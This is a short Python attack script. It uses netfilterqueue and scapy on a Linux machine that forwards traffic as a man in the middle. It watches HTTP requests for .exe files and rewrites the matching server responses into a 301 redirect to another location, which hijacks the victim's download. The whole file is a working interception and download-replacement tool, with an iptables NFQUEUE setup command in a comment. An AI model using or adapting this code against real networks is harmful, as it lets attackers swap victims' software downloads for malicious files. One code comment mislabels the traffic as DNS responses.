#!/usr/bin/env python

import netfilterqueue as netfilterq
import scapy.all as scapy

# This script should be run in linux
# It relies on iptable queue to store the received packets before redirection
# iptables -I FORWARD -j NFQUEUE --queue-num 0

ack_list = []

def access_packet_queue():
    #NetFilter instance
    queue = netfilterq.NetfilterQueue()
    #Binding to previous created queue
    queue.bind(0, packet_callback)
    queue.run()

def packet_crafter(pack, load):
    pack[scapy.Raw].load = load
    del pack[scapy.IP].len
    del pack[scapy.IP].chksum
    del pack[scapy.TCP].chksum
    return pack


def packet_callback(packet):

    #Converting packet from the queue in toscapy format
    s_packet = scapy.IP(packet.get_payload())
    # Filtering DNS Responses
    if s_packet.haslayer(scapy.Raw):
        # If packet is HTTP Request
        if s_packet[scapy.TCP].dport == 80:
            print("REQUEST \n")
            if ".exe" in s_packet[scapy.Raw].load:
                print("request for .exe File Found ... Storing ACK for future match")
                ack_list.append(s_packet[scapy.TCP].ack)
        if s_packet[scapy.TCP].sport == 80:
            print("RESPONSE \n")
            if s_packet[scapy.TCP].seq in ack_list:
                print("Proceeding to content modification")
                ack_list.remove(s_packet[scapy.TCP].seq)
                mod_pack = packet_crafter(s_packet, "HTTP/1.1 301 Moved Permanently\nLocation: http://www.example.org/index.asp\n")
                packet.set_payload(str(mod_pack))

    packet.accept()


access_packet_queue()